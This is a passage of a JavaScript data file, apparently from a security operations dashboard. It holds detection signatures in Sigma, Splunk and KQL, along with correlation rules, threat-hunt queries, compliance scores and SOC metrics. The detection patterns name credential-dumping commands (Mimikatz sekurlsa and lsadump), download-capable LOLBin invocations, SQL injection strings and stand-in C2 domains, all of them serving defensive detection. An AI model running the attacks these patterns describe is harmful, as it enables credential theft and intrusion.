   kql:'SecurityEvent | where EventID == 4688 | where NewProcessName endswith "\\\\powershell.exe" | where CommandLine contains "-enc" or CommandLine contains "-encodedcommand"'},
  {id:'SIG-002',title:'Mimikatz Execution',status:'production',level:'critical',
   yaml:'title: Mimikatz Execution\nstatus: production\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_name:\n    Image|endswith: \'\\\\mimikatz.exe\'\n  selection_cmd:\n    CommandLine|contains:\n      - \'sekurlsa::logonpasswords\'\n      - \'lsadump::dcsync\'\n      - \'privilege::debug\'\n  condition: selection_name or selection_cmd\ntags:\n  - attack.credential_access\n  - attack.t1003.001',
   splunk:'index=windows sourcetype=WinEventLog:Security EventCode=4688 (NewProcessName="*\\\\mimikatz.exe" OR CommandLine="*sekurlsa::logonpasswords*" OR CommandLine="*lsadump::dcsync*")',
   kql:'SecurityEvent | where EventID == 4688 | where NewProcessName endswith "\\\\mimikatz.exe" or CommandLine has_any ("sekurlsa::logonpasswords","lsadump::dcsync")'},
  {id:'SIG-003',title:'Kerberoasting - Service Ticket Request',status:'production',level:'high',
   yaml:'title: Kerberoasting - Service Ticket Request\nstatus: production\nlevel: high\nlogsource:\n  product: windows\n  service: security\ndetection:\n  selection:\n    EventID: 4769\n    TicketEncryptionType: \'0x17\'\n    ServiceName|endswith: \'$\'\n  filter:\n    ServiceName: \'krbtgt\'\n  condition: selection and not filter\ntags:\n  - attack.credential_access\n  - attack.t1558.003',
   splunk:'index=windows sourcetype=WinEventLog:Security EventCode=4769 TicketEncryptionType=0x17 ServiceName!="krbtgt" | where NOT match(ServiceName,"\\$$")',
   kql:'SecurityEvent | where EventID == 4769 | where TicketEncryptionType == "0x17" | where ServiceName != "krbtgt"'},
  {id:'SIG-004',title:'Windows Audit Log Cleared',status:'production',level:'critical',
   yaml:'title: Windows Audit Log Cleared\nstatus: production\nlevel: critical\nlogsource:\n  product: windows\n  service: security\ndetection:\n  selection:\n    EventID: 1102\n  condition: selection\ntags:\n  - attack.defense_evasion\n  - attack.t1070.001',
   splunk:'index=windows sourcetype=WinEventLog:Security EventCode=1102',
   kql:'SecurityEvent | where EventID == 1102'},
  {id:'SIG-005',title:'Suspicious Service Installation',status:'production',level:'high',
   yaml:'title: Suspicious Service Installation\nstatus: production\nlevel: high\nlogsource:\n  product: windows\n  service: system\ndetection:\n  selection:\n    EventID: 7045\n  filter_legit:\n    ServiceName|startswith:\n      - \'Windows\'\n      - \'Microsoft\'\n    ImagePath|startswith: \'C:\\\\Windows\\\\System32\\\\\'\n  condition: selection and not filter_legit\ntags:\n  - attack.persistence\n  - attack.t1543.003',
   splunk:'index=windows sourcetype=WinEventLog:System EventCode=7045 NOT (ServiceName="Windows*" ImagePath="C:\\\\Windows\\\\System32\\\\*")',
   kql:'Event | where EventID == 7045 | where ServiceName !startswith "Windows" or ImagePath !startswith "C:\\\\Windows\\\\System32\\\\"'},
  {id:'SIG-006',title:'SSH Brute Force from Single Source',status:'production',level:'high',
   yaml:'title: SSH Brute Force from Single Source\nstatus: production\nlevel: high\nlogsource:\n  product: linux\n  service: sshd\ndetection:\n  selection:\n    eventid: \'Failed password\'\n  condition: selection | count(src_ip) by dst_ip > 10\n  timeframe: 5m\ntags:\n  - attack.credential_access\n  - attack.t1110.001',
   splunk:'index=linux sourcetype=syslog "Failed password" | stats count by src_ip dest_ip | where count > 10',
   kql:'Syslog | where SyslogMessage contains "Failed password" | summarize count() by SrcIP, DstIP | where count_ > 10'},
  {id:'SIG-007',title:'Pass-the-Hash Logon',status:'production',level:'critical',
   yaml:'title: Pass-the-Hash Logon\nstatus: production\nlevel: critical\nlogsource:\n  product: windows\n  service: security\ndetection:\n  selection:\n    EventID: 4624\n    LogonType: 3\n    AuthenticationPackageName: \'NTLM\'\n    LogonProcessName: \'NtLmSsp\'\n  filter:\n    SubjectUserName|endswith: \'$\'\n  condition: selection and not filter\ntags:\n  - attack.lateral_movement\n  - attack.t1550.002',
   splunk:'index=windows sourcetype=WinEventLog:Security EventCode=4624 LogonType=3 AuthenticationPackageName=NTLM LogonProcessName=NtLmSsp | where NOT match(SubjectUserName,"\\$$")',
   kql:'SecurityEvent | where EventID == 4624 | where LogonType == 3 | where AuthenticationPackageName == "NTLM" | where LogonProcessName == "NtLmSsp"'},
  {id:'SIG-008',title:'Scheduled Task Created for Persistence',status:'production',level:'high',
   yaml:'title: Scheduled Task Created for Persistence\nstatus: production\nlevel: high\nlogsource:\n  product: windows\n  service: security\ndetection:\n  selection:\n    EventID: 4698\n  filter:\n    TaskName|contains:\n      - \'\\\\Microsoft\\\\Windows\\\\WindowsUpdate\'\n      - \'\\\\Microsoft\\\\Windows\\\\Maintenance\'\n  condition: selection\ntags:\n  - attack.persistence\n  - attack.t1053.005',
   splunk:'index=windows sourcetype=WinEventLog:Security EventCode=4698',
   kql:'SecurityEvent | where EventID == 4698'},
  {id:'SIG-009',title:'DCSync Attack Detected',status:'production',level:'critical',
   yaml:'title: DCSync Attack Detected\nstatus: production\nlevel: critical\nlogsource:\n  product: windows\n  service: security\ndetection:\n  selection:\n    EventID: 4662\n    Properties|contains:\n      - \'1131f6aa-9c07-11d1-f79f-00c04fc2dcd2\'\n      - \'1131f6ad-9c07-11d1-f79f-00c04fc2dcd2\'\n  filter:\n    SubjectUserName|endswith: \'$\'\n  condition: selection and not filter\ntags:\n  - attack.credential_access\n  - attack.t1003.006',
   splunk:'index=windows sourcetype=WinEventLog:Security EventCode=4662 Properties="*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*" OR Properties="*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*"',
   kql:'SecurityEvent | where EventID == 4662 | where Properties has "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" or Properties has "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"'},
  {id:'SIG-010',title:'DNS Query to Known C2 Domain',status:'production',level:'high',
   yaml:'title: DNS Query to Known C2 Domain\nstatus: production\nlevel: high\nlogsource:\n  category: dns\ndetection:\n  selection:\n    query|endswith:\n      - \'.evil.com\'\n      - \'.malware.xyz\'\n      - \'.c2server.net\'\n  condition: selection\ntags:\n  - attack.command_and_control\n  - attack.t1071.004',
   splunk:'index=dns query="*.evil.com" OR query="*.malware.xyz" OR query="*.c2server.net"',
   kql:'DnsEvents | where Name endswith ".evil.com" or Name endswith ".malware.xyz" or Name endswith ".c2server.net"'},
  {id:'SIG-011',title:'Data Exfiltration via Large HTTP POST',status:'production',level:'high',
   yaml:'title: Data Exfiltration via Large HTTP POST\nstatus: production\nlevel: high\nlogsource:\n  category: proxy\ndetection:\n  selection:\n    cs-method: \'POST\'\n    sc-bytes|gte: 10000000\n  filter:\n    cs-host|contains:\n      - \'microsoft.com\'\n      - \'google.com\'\n      - \'amazonaws.com\'\n  condition: selection and not filter\ntags:\n  - attack.exfiltration\n  - attack.t1048.003',
   splunk:'index=proxy cs_method=POST sc_bytes>10000000 NOT (cs_host="*microsoft.com" OR cs_host="*google.com")',
   kql:'CommonSecurityLog | where RequestMethod == "POST" | where SentBytes > 10000000'},
  {id:'SIG-012',title:'AWS IAM User Created with Admin Policy',status:'production',level:'critical',
   yaml:'title: AWS IAM User Created with Admin Policy\nstatus: production\nlevel: critical\nlogsource:\n  product: aws\n  service: cloudtrail\ndetection:\n  sel_create:\n    eventName: \'CreateUser\'\n  sel_attach:\n    eventName: \'AttachUserPolicy\'\n    requestParameters.policyArn|contains: \'AdministratorAccess\'\n  condition: sel_create or sel_attach\n  timeframe: 5m\ntags:\n  - attack.persistence\n  - attack.t1098',
   splunk:'index=aws sourcetype=aws:cloudtrail (eventName=CreateUser OR (eventName=AttachUserPolicy requestParameters.policyArn="*AdministratorAccess*"))',
   kql:'AWSCloudTrail | where EventName == "CreateUser" or (EventName == "AttachUserPolicy" and RequestParameters contains "AdministratorAccess")'},
  {id:'SIG-013',title:'S3 Bucket Policy Made Public',status:'production',level:'critical',
   yaml:'title: S3 Bucket Policy Made Public\nstatus: production\nlevel: critical\nlogsource:\n  product: aws\n  service: cloudtrail\ndetection:\n  selection:\n    eventName: \'PutBucketPolicy\'\n    requestParameters.bucketPolicy.Statement.Principal: \'*\'\n  condition: selection\ntags:\n  - attack.collection\n  - attack.t1530',
   splunk:'index=aws sourcetype=aws:cloudtrail eventName=PutBucketPolicy | where match(requestParameters,"Principal.*\\*")',
   kql:'AWSCloudTrail | where EventName == "PutBucketPolicy" | where RequestParameters contains "\\"Principal\\":\\"*\\""'},
  {id:'SIG-014',title:'Azure Sign-in from Risky Location',status:'production',level:'medium',
   yaml:'title: Azure Sign-in from Risky Location\nstatus: production\nlevel: medium\nlogsource:\n  product: azure\n  service: signinlogs\ndetection:\n  selection:\n    RiskLevelDuringSignIn: \'high\'\n    Status.errorCode: 0\n  condition: selection\ntags:\n  - attack.initial_access\n  - attack.t1078.004',
   splunk:'index=azure sourcetype=azure:signinlogs RiskLevelDuringSignIn=high "Status.errorCode"=0',
   kql:'SigninLogs | where RiskLevelDuringSignIn == "high" | where ResultType == 0'},
  {id:'SIG-015',title:'GCP Service Account Key Creation',status:'production',level:'high',
   yaml:'title: GCP Service Account Key Creation\nstatus: production\nlevel: high\nlogsource:\n  product: gcp\n  service: audit\ndetection:\n  selection:\n    methodName: \'google.iam.admin.v1.CreateServiceAccountKey\'\n  condition: selection\ntags:\n  - attack.persistence\n  - attack.t1098.001',
   splunk:'index=gcp sourcetype=gcp:audit methodName="google.iam.admin.v1.CreateServiceAccountKey"',
   kql:'GCPAuditLog | where MethodName == "google.iam.admin.v1.CreateServiceAccountKey"'},
];

// ========== CORRELATION RULES ==========
const CORRELATION_RULES = [
  {id:'COR-001',name:'Brute Force Followed by Successful Login',description:'Failed logins from same source followed by success within 10 minutes',events:['4625 (x5+)','4624'],window:'10m',severity:'Critical',mitre:'T1110',action:'Alert + Block Source IP'},
  {id:'COR-002',name:'Privilege Escalation Chain',description:'Normal logon followed by privilege assignment and new process creation',events:['4624','4672','4688'],window:'5m',severity:'Critical',mitre:'T1068',action:'Alert + Isolate Host'},
  {id:'COR-003',name:'Lateral Movement Pattern',description:'Successful auth on host A followed by SMB/RDP connection to host B',events:['4624 (Host A)','5156 (Outbound 445/3389)','4624 (Host B)'],window:'15m',severity:'High',mitre:'T1021',action:'Alert + Network Segment'},
  {id:'COR-004',name:'Data Staging and Exfiltration',description:'Mass file access followed by archive creation and large outbound transfer',events:['4663 (x10+)','4688 (7z/rar/zip)','Proxy POST >10MB'],window:'30m',severity:'Critical',mitre:'T1074',action:'Alert + Block Transfer'},
  {id:'COR-005',name:'Account Takeover Sequence',description:'Password spray followed by MFA push flood then successful auth',events:['4625 (multi-user)','MFA Push (x3+)','4624 (success)'],window:'15m',severity:'Critical',mitre:'T1621',action:'Alert + Disable Account'},
  {id:'COR-006',name:'Persistence Installation',description:'New service or scheduled task created from a suspicious parent process',events:['4688 (cmd/powershell)','7045 OR 4698'],window:'5m',severity:'High',mitre:'T1543',action:'Alert + Remove Persistence'},
  {id:'COR-007',name:'Defense Evasion After Attack',description:'Security tool process terminated followed by log clearing',events:['4689 (AV/EDR process)','1102'],window:'10m',severity:'Critical',mitre:'T1562',action:'Alert + Restore Logs'},
  {id:'COR-008',name:'Cloud Credential Compromise',description:'IAM user creation followed by admin policy attachment and S3 access',events:['CreateUser','AttachUserPolicy (Admin)','GetObject/PutBucketPolicy'],window:'30m',severity:'Critical',mitre:'T1098',action:'Alert + Revoke Keys'},
];

// ========== HUNT HYPOTHESES ==========
const HUNT_HYPOTHESES = [
  {id:'HH-001',name:'Living Off the Land Binaries',hypothesis:'Attackers may be using LOLBins (certutil, bitsadmin, mshta) for download/execution',datasource:'Windows Process Creation (4688)',query:'EventCode=4688 (NewProcessName="*certutil*" OR NewProcessName="*bitsadmin*" OR NewProcessName="*mshta*" OR NewProcessName="*regsvr32*" OR NewProcessName="*rundll32*") | stats count by NewProcessName CommandLine SubjectUserName',mitre:'T1218',status:'open',findings:0},
  {id:'HH-002',name:'DNS Tunneling Detection',hypothesis:'Compromised hosts may use DNS for C2 by encoding data in subdomain queries',datasource:'DNS Query Logs',query:'sourcetype=dns | eval len=len(query) | where len > 50 | stats count avg(len) by src_ip query | where count > 100',mitre:'T1071.004',status:'open',findings:0},
  {id:'HH-003',name:'Beaconing Activity',hypothesis:'C2 implants beacon at regular intervals, detectable via connection frequency analysis',datasource:'Firewall/Proxy Logs',query:'sourcetype=proxy | bucket _time span=1m | stats count by src_ip dest_ip _time | eventstats stdev(count) avg(count) by src_ip dest_ip | where stdev < 0.5 AND avg > 1',mitre:'T1071.001',status:'active',findings:3},
  {id:'HH-004',name:'Credential Stuffing Detection',hypothesis:'Attackers may use stolen credentials from breaches against our authentication systems',datasource:'Authentication Logs',query:'sourcetype=auth action=failure | stats dc(user) count by src_ip | where dc_user > 5 AND count > 20',mitre:'T1110.004',status:'open',findings:0},
  {id:'HH-005',name:'Abnormal Service Account Usage',hypothesis:'Compromised service accounts may be used interactively or from unexpected hosts',datasource:'Windows Logon Events',query:'EventCode=4624 SubjectUserName="svc-*" (LogonType=2 OR LogonType=10) | stats count by SubjectUserName SourceIP LogonType',mitre:'T1078.002',status:'active',findings:2},
  {id:'HH-006',name:'Internal Reconnaissance',hypothesis:'Post-exploitation recon via net, nltest, dsquery commands',datasource:'Windows Process Creation',query:'EventCode=4688 (CommandLine="*net group*" OR CommandLine="*nltest*" OR CommandLine="*dsquery*" OR CommandLine="*whoami /all*" OR CommandLine="*systeminfo*") | stats count values(CommandLine) by SubjectUserName ComputerName',mitre:'T1087',status:'open',findings:0},
  {id:'HH-007',name:'Scheduled Task Anomalies',hypothesis:'Attackers create scheduled tasks pointing to unusual paths for persistence',datasource:'Windows Task Scheduler',query:'EventCode=4698 | where NOT match(TaskContent,"C:\\\\Windows\\\\System32") | stats count by TaskName SubjectUserName TaskContent',mitre:'T1053.005',status:'active',findings:1},
  {id:'HH-008',name:'RDP Tunneling',hypothesis:'Attackers may tunnel RDP via SSH or port forwarding to bypass network controls',datasource:'Network Flow Data',query:'sourcetype=flow dest_port=3389 | where NOT cidrmatch("10.0.0.0/8",src_ip) | stats count by src_ip dest_ip',mitre:'T1572',status:'open',findings:0},
  {id:'HH-009',name:'WMI Lateral Movement',hypothesis:'WMI may be used for remote code execution across the network',datasource:'Windows WMI Events',query:'EventCode=4688 NewProcessName="*wmiprvse.exe" OR (NewProcessName="*wmic.exe" CommandLine="*/node:*") | stats count by SubjectUserName ComputerName CommandLine',mitre:'T1047',status:'open',findings:0},
  {id:'HH-010',name:'Shadow Admin Detection',hypothesis:'Users with high privileges not in documented admin groups',datasource:'Active Directory',query:'| ldapsearch search="(&(adminCount=1)(!(memberOf=CN=Domain Admins*)))" attrs="sAMAccountName,memberOf,adminCount"',mitre:'T1078.002',status:'open',findings:0},
  {id:'HH-011',name:'Golden Ticket Usage',hypothesis:'Kerberos TGTs with anomalous lifetimes suggesting forged tickets',datasource:'Windows Kerberos Events',query:'EventCode=4768 | eval ticket_lifetime=TicketExpireTime-TicketGrantTime | where ticket_lifetime > 36000 | stats count by TargetUserName SourceIP ticket_lifetime',mitre:'T1558.001',status:'open',findings:0},
  {id:'HH-012',name:'Email Exfiltration',hypothesis:'Large or unusual email forwards to external addresses may indicate data theft',datasource:'Email Gateway Logs',query:'sourcetype=email direction=outbound | where attachment_size > 5000000 OR recipient_count > 10 | stats sum(attachment_size) count by sender recipient_domain',mitre:'T1048.003',status:'open',findings:0},
];

// ========== COMPLIANCE FRAMEWORKS ==========
const COMPLIANCE = {
  nist_csf: {
    name:'NIST CSF 2.0',version:'2.0',
    categories:[
      {id:'GV',name:'Govern',controls:[
        {id:'GV.OC-01',name:'Organizational Context',status:'pass',score:90,detail:'Organizational mission and stakeholder expectations documented'},
        {id:'GV.RM-01',name:'Risk Management Strategy',status:'pass',score:85,detail:'Risk management strategy established and communicated'},
        {id:'GV.SC-01',name:'Supply Chain Risk',status:'partial',score:60,detail:'Third-party risk assessment process needs improvement'},
      ]},
      {id:'ID',name:'Identify',controls:[
        {id:'ID.AM-01',name:'Asset Management',status:'pass',score:92,detail:'Hardware and software inventories maintained and current'},
        {id:'ID.AM-02',name:'Software Inventory',status:'pass',score:88,detail:'Authorized software inventory maintained via CMDB'},
        {id:'ID.RA-01',name:'Risk Assessment',status:'pass',score:82,detail:'Vulnerability identification and tracking in place'},
        {id:'ID.RA-05',name:'Risk Prioritization',status:'partial',score:70,detail:'Risk prioritization process defined but inconsistently applied'},
      ]},
      {id:'PR',name:'Protect',controls:[
        {id:'PR.AA-01',name:'Identity Management',status:'pass',score:95,detail:'Centralized identity provider with MFA enforcement'},
        {id:'PR.AA-03',name:'Access Control',status:'pass',score:88,detail:'RBAC implemented across all critical systems'},
        {id:'PR.DS-01',name:'Data-at-Rest Protection',status:'partial',score:75,detail:'Encryption at rest enabled for databases; some file shares unencrypted'},
        {id:'PR.DS-02',name:'Data-in-Transit Protection',status:'pass',score:92,detail:'TLS 1.3 enforced for all external communications'},
        {id:'PR.PS-01',name:'Configuration Management',status:'fail',score:45,detail:'Baseline configurations not consistently applied to cloud workloads'},
      ]},
      {id:'DE',name:'Detect',controls:[
        {id:'DE.CM-01',name:'Network Monitoring',status:'pass',score:90,detail:'IDS/IPS deployed at all network boundaries'},
        {id:'DE.CM-03',name:'Personnel Activity Monitoring',status:'pass',score:85,detail:'User behavior analytics deployed'},
        {id:'DE.AE-02',name:'Event Analysis',status:'pass',score:88,detail:'SIEM with correlation rules and alert triage'},
        {id:'DE.AE-06',name:'Incident Reporting',status:'partial',score:72,detail:'Automated alerting in place; manual escalation paths need documentation'},
      ]},
      {id:'RS',name:'Respond',controls:[
        {id:'RS.MA-01',name:'Incident Management',status:'pass',score:85,detail:'IR playbooks defined for top 10 incident types'},
        {id:'RS.MA-03',name:'Incident Reporting',status:'partial',score:65,detail:'Internal reporting automated; regulatory notification process needs improvement'},
        {id:'RS.MI-01',name:'Incident Mitigation',status:'pass',score:82,detail:'Containment and eradication procedures documented'},
      ]},
      {id:'RC',name:'Recover',controls:[
        {id:'RC.RP-01',name:'Recovery Planning',status:'pass',score:80,detail:'DR/BCP plans documented and tested annually'},
        {id:'RC.CO-01',name:'Recovery Communication',status:'partial',score:68,detail:'Stakeholder communication plan exists but untested'},
      ]},
    ]
  },
  cis_controls: {
    name:'CIS Controls v8',version:'8.0',
    categories:[
      {id:'CIS-01',name:'Inventory of Enterprise Assets',controls:[
        {id:'1.1',name:'Establish Asset Inventory',status:'pass',score:90,detail:'Automated discovery scanning weekly'},
        {id:'1.2',name:'Address Unauthorized Assets',status:'partial',score:70,detail:'Rogue device detection in place; response SLA not met consistently'},
      ]},
      {id:'CIS-02',name:'Inventory of Software Assets',controls:[
        {id:'2.1',name:'Establish Software Inventory',status:'pass',score:85,detail:'Application whitelist maintained'},
        {id:'2.3',name:'Address Unauthorized Software',status:'partial',score:65,detail:'App control policies defined but not enforced on all endpoints'},
      ]},
      {id:'CIS-03',name:'Data Protection',controls:[
        {id:'3.1',name:'Establish Data Management Process',status:'pass',score:80,detail:'Data classification policy in place'},
        {id:'3.4',name:'Enforce Data Retention',status:'partial',score:60,detail:'Retention policies defined; automated enforcement incomplete'},
        {id:'3.10',name:'Encrypt Sensitive Data in Transit',status:'pass',score:95,detail:'TLS 1.3 enforced enterprise-wide'},
      ]},
      {id:'CIS-04',name:'Secure Configuration',controls:[
        {id:'4.1',name:'Establish Secure Configuration Process',status:'fail',score:40,detail:'CIS benchmarks not applied to cloud workloads'},
        {id:'4.7',name:'Manage Default Accounts',status:'pass',score:85,detail:'Default credentials changed; unnecessary accounts disabled'},
      ]},
      {id:'CIS-05',name:'Account Management',controls:[
        {id:'5.1',name:'Establish Account Inventory',status:'pass',score:92,detail:'Centralized IAM with periodic access reviews'},
        {id:'5.2',name:'Use Unique Passwords',status:'pass',score:90,detail:'Password policy enforced via AD GPO'},
        {id:'5.4',name:'Restrict Admin Privileges',status:'pass',score:88,detail:'PAM solution deployed for privileged access'},
      ]},
      {id:'CIS-06',name:'Access Control Management',controls:[
        {id:'6.1',name:'Establish Access Granting Process',status:'pass',score:85,detail:'Ticketed access request workflow'},
        {id:'6.5',name:'Require MFA for Admin Access',status:'pass',score:95,detail:'MFA enforced for all admin and remote access'},
      ]},
      {id:'CIS-08',name:'Audit Log Management',controls:[
        {id:'8.1',name:'Establish Audit Log Process',status:'pass',score:88,detail:'Centralized log collection to SIEM'},
        {id:'8.2',name:'Collect Audit Logs',status:'pass',score:85,detail:'Logs from all critical systems forwarded'},
        {id:'8.5',name:'Collect DNS Query Logs',status:'pass',score:90,detail:'All DNS queries logged and analyzed'},
      ]},
      {id:'CIS-13',name:'Network Monitoring and Defense',controls:[
        {id:'13.1',name:'Centralize Security Event Alerting',status:'pass',score:88,detail:'SIEM with real-time alerting'},
        {id:'13.6',name:'Collect Network Traffic Flow Logs',status:'partial',score:72,detail:'NetFlow collected at perimeter; internal flow logging incomplete'},
      ]},
    ]
  },
  soc2: {
    name:'SOC 2 Type II',version:'2017',
    categories:[
      {id:'CC1',name:'Control Environment',controls:[
        {id:'CC1.1',name:'COSO Principle 1',status:'pass',score:90,detail:'Commitment to integrity and ethical values demonstrated'},
        {id:'CC1.2',name:'COSO Principle 2',status:'pass',score:85,detail:'Board exercises oversight over internal controls'},
      ]},
      {id:'CC2',name:'Communication and Information',controls:[
        {id:'CC2.1',name:'COSO Principle 13',status:'pass',score:82,detail:'Relevant quality information obtained and communicated'},
        {id:'CC2.2',name:'COSO Principle 14',status:'partial',score:68,detail:'Internal communication of control objectives needs improvement'},
      ]},
      {id:'CC3',name:'Risk Assessment',controls:[
        {id:'CC3.1',name:'COSO Principle 6',status:'pass',score:88,detail:'Risk assessment objectives specified'},
        {id:'CC3.2',name:'COSO Principle 7',status:'pass',score:80,detail:'Risks identified and analyzed'},
      ]},
      {id:'CC5',name:'Control Activities',controls:[
        {id:'CC5.1',name:'COSO Principle 10',status:'pass',score:85,detail:'Control activities selected and developed'},
        {id:'CC5.2',name:'COSO Principle 11',status:'pass',score:82,detail:'Technology general controls in place'},
      ]},
      {id:'CC6',name:'Logical and Physical Access',controls:[
        {id:'CC6.1',name:'Logical Access Security',status:'pass',score:92,detail:'Logical access controls implemented'},
        {id:'CC6.2',name:'User Access Provisioning',status:'pass',score:88,detail:'Access provisioning based on job function'},
        {id:'CC6.3',name:'Access Removal',status:'partial',score:72,detail:'Offboarding access removal within 24h for most; some legacy systems delayed'},
        {id:'CC6.6',name:'System Boundaries',status:'pass',score:90,detail:'Network segmentation and boundary protection in place'},
      ]},
      {id:'CC7',name:'System Operations',controls:[
        {id:'CC7.1',name:'Detect/Monitor Events',status:'pass',score:88,detail:'Continuous monitoring and alerting configured'},
        {id:'CC7.2',name:'Monitor System Components',status:'pass',score:85,detail:'Infrastructure monitoring with automated alerts'},
        {id:'CC7.3',name:'Evaluate Security Events',status:'pass',score:82,detail:'Security events evaluated and classified'},
        {id:'CC7.4',name:'Respond to Events',status:'partial',score:75,detail:'Response procedures defined; tabletop exercises scheduled'},
      ]},
      {id:'CC8',name:'Change Management',controls:[
        {id:'CC8.1',name:'Change Authorization',status:'pass',score:90,detail:'Change management board reviews all production changes'},
      ]},
      {id:'CC9',name:'Risk Mitigation',controls:[
        {id:'CC9.1',name:'Risk Mitigation Activities',status:'pass',score:85,detail:'Compensating controls documented for accepted risks'},
        {id:'CC9.2',name:'Vendor Risk Management',status:'partial',score:65,detail:'Vendor assessments conducted but frequency needs increase'},
      ]},
    ]
  }
};

// ========== SOC METRICS ==========
const SOC_METRICS = {
  mttd: {current:12,target:10,unit:'min',trend:[-18,-15,-14,-12,-13,-11,-12]},
  mttr: {current:45,target:30,unit:'min',trend:[62,55,50,48,47,44,45]},
  alertVolume: {today:284,yesterday:312,week:[256,289,301,312,278,295,284]},
  falsePositiveRate: {current:18,target:15,unit:'%',trend:[25,22,21,20,19,18,18]},
  escalationRate: {current:8,target:5,unit:'%'},
  closedToday: 198,
  openAlerts: 86,
  criticalOpen: 12,
  analystLoad: [
    {name:'Analyst-1',open:22,closed:45,avgTime:38},
    {name:'Analyst-2',open:18,closed:52,avgTime:32},
    {name:'Analyst-3',open:15,closed:61,avgTime:28},
    {name:'Analyst-4',open:12,closed:40,avgTime:42},
  ],
  shifts: [
    {shift:'Day (06:00-14:00)',analysts:['Analyst-1','Analyst-2'],lead:'Analyst-1',alerts:142},
    {shift:'Swing (14:00-22:00)',analysts:['Analyst-3','Analyst-4'],lead:'Analyst-3',alerts:98},
    {shift:'Night (22:00-06:00)',analysts:['Analyst-5','Analyst-6'],lead:'Analyst-5',alerts:44},
  ],
  topSources: [{name:'EDR',count:89},{name:'SIEM',count:72},{name:'WAF',count:45},{name:'IDS',count:38},{name:'DLP',count:22},{name:'DNS',count:18}],
  topMitre: [{id:'T1059',name:'Command and Scripting',count:34},{id:'T1071',name:'Application Layer Protocol',count:28},{id:'T1110',name:'Brute Force',count:22},{id:'T1003',name:'OS Credential Dumping',count:18},{id:'T1021',name:'Remote Services',count:15}],
};

// ========== DETECTION RULES ==========
const DETECTION_RULES = [
  {id:'DET-001',name:'SSH Brute Force',type:'threshold',source:'Auth Logs',condition:'Failed SSH logins > 10 in 5min from single IP',severity:'High',enabled:true,mitre:'T1110.001',action:'Alert + GeoIP Block'},
  {id:'DET-002',name:'SQL Injection in Web Logs',type:'pattern',source:'WAF/Proxy',condition:'Request contains UNION SELECT, OR 1=1, DROP TABLE, xp_cmdshell',severity:'Critical',enabled:true,mitre:'T1190',action:'Alert + Block IP'},
  {id:'DET-003',name:'Encoded PowerShell Execution',type:'pattern',source:'Windows Events',condition:'Process powershell.exe with -enc or -encodedcommand flags',severity:'High',enabled:true,mitre:'T1059.001',action:'Alert + Collect Script Block'},
  {id:'DET-004',name:'New Local Admin Account',type:'event',source:'Windows Events',condition:'EventID 4720 followed by 4732 (Administrators group)',severity:'High',enabled:true,mitre:'T1136.001',action:'Alert + Disable Account'},
  {id:'DET-005',name:'Cobalt Strike Beacon Pattern',type:'behavioral',source:'NDR/EDR',condition:'Regular interval HTTPS POST to fixed URI with jitter < 20%',severity:'Critical',enabled:true,mitre:'T1071.001',action:'Alert + Block C2 + Isolate'},
  {id:'DET-006',name:'Mass File Access',type:'threshold',source:'File Server',condition:'> 50 file reads in 1min by single user on sensitive shares',severity:'High',enabled:true,mitre:'T1039',action:'Alert + Suspend Access'},
  {id:'DET-007',name:'Data Exfil via DNS',type:'behavioral',source:'DNS Logs',condition:'DNS queries with subdomain length > 40 chars or > 100 queries/min to single domain',severity:'Critical',enabled:true,mitre:'T1048.001',action:'Alert + Block Domain'},
  {id:'DET-008',name:'Kerberoasting',type:'pattern',source:'Windows Events',condition:'EventID 4769 with encryption type 0x17 (RC4) for non-krbtgt SPN',severity:'High',enabled:true,mitre:'T1558.003',action:'Alert + Reset SPN Passwords'},
  {id:'DET-009',name:'Ransomware Behavior',type:'behavioral',source:'EDR',condition:'Rapid file rename/encrypt operations (> 100 files/min) with entropy change',severity:'Critical',enabled:true,mitre:'T1486',action:'Alert + Isolate + Kill Process'},
  {id:'DET-010',name:'Audit Log Cleared',type:'event',source:'Windows Events',condition:'EventID 1102 from non-system account',severity:'Critical',enabled:true,mitre:'T1070.001',action:'Alert + Restore from Backup'},
  {id:'DET-011',name:'RDP from External IP',type:'pattern',source:'Firewall',condition:'Inbound TCP/3389 from non-VPN external IP',severity:'High',enabled:true,mitre:'T1021.001',action:'Alert + Block'},
  {id:'DET-012',name:'Pass-the-Hash',type:'pattern',source:'Windows Events',condition:'EventID 4624 LogonType 3 NTLM from non-machine account',severity:'Critical',enabled:true,mitre:'T1550.002',action:'Alert + Reset Credentials'},
  {id:'DET-013',name:'Impossible Travel',type:'behavioral',source:'Auth Logs',condition:'Successful auth from 2 geolocations > 500mi apart within 30min',severity:'Medium',enabled:true,mitre:'T1078',action:'Alert + MFA Challenge'},
  {id:'DET-014',name:'LOLBin Execution',type:'pattern',source:'Windows Events',condition:'certutil -urlcache, bitsadmin /transfer, mshta http, regsvr32 /s /u',severity:'High',enabled:true,mitre:'T1218',action:'Alert + Quarantine File'},
  {id:'DET-015',name:'Scheduled Task Persistence',type:'event',source:'Windows Events',condition:'EventID 4698 with task pointing to Temp/AppData/unusual path',severity:'High',enabled:true,mitre:'T1053.005',action:'Alert + Remove Task'},
  {id:'DET-016',name:'AWS Root Account Login',type:'event',source:'CloudTrail',condition:'ConsoleLogin with userIdentity.type=Root',severity:'Critical',enabled:true,mitre:'T1078.004',action:'Alert + Notify SecOps Lead'},
  {id:'DET-017',name:'Container Escape Attempt',type:'behavioral',source:'Container Runtime',condition:'Process in container attempts to access host namespace or mount host filesystem',severity:'Critical',enabled:true,mitre:'T1611',action:'Alert + Kill Container'},
  {id:'DET-018',name:'DGA Domain Resolution',type:'behavioral',source:'DNS',condition:'DNS queries matching DGA patterns (high consonant ratio, random appearance)',severity:'High',enabled:true,mitre:'T1568.002',action:'Alert + Sinkhole Domain'},
  {id:'DET-019',name:'Web Shell Upload',type:'pattern',source:'WAF/File Integrity',condition:'New .php/.aspx/.jsp file in webroot with eval/exec/system calls',severity:'Critical',enabled:true,mitre:'T1505.003',action:'Alert + Delete + Block IP'},
  {id:'DET-020',name:'Honeypot Interaction',type:'event',source:'Honeypot',condition:'Any successful authentication to honeypot system',severity:'High',enabled:true,mitre:'T1110',action:'Alert + Block Source + Investigate'},
  {id:'DET-021',name:'Cloud Storage Made Public',type:'event',source:'Cloud Audit',condition:'S3 PutBucketPolicy/Azure SetContainerACL with public access',severity:'Critical',enabled:true,mitre:'T1530',action:'Alert + Revert Policy'},
